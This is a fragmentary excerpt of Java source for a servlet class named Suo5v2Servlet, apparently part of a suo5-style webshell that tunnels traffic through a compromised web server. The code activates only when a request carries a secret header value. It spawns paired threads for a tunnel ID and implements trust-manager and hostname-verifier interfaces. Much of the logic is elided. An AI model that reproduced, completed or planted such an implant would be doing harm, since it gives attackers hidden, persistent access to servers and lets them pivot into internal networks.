 ...
 * @since 2025/12/9
 */
public class Suo5v2Servlet implements Servlet, Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5v2Servlet(InputStream in, OutputStream out, String tunId) {
        this.gInStream = in;
        this.gOutStream = out;
        this.gtunId = tunId;
    }

    public Suo5v2Servlet(String tunId, int mode) {
        this.gtunId = tunId;
        this.mode = mode;
    }
    ...
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        ...
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                new Suo5v2Servlet().process(request, response);
            }
...
//
    ...
    private byte[] performCreate(HttpServletRequest request, HashMap dataMap, String tunId, boolean newThread) throws Exception {
        ...
        try {
            ...
            if (newThread) {
                new Thread(new Suo5v2Servlet(tunId, 1)).start();
                new Thread(new Suo5v2Servlet(tunId, 2)).start();
            }
        } catch (Exception e) {
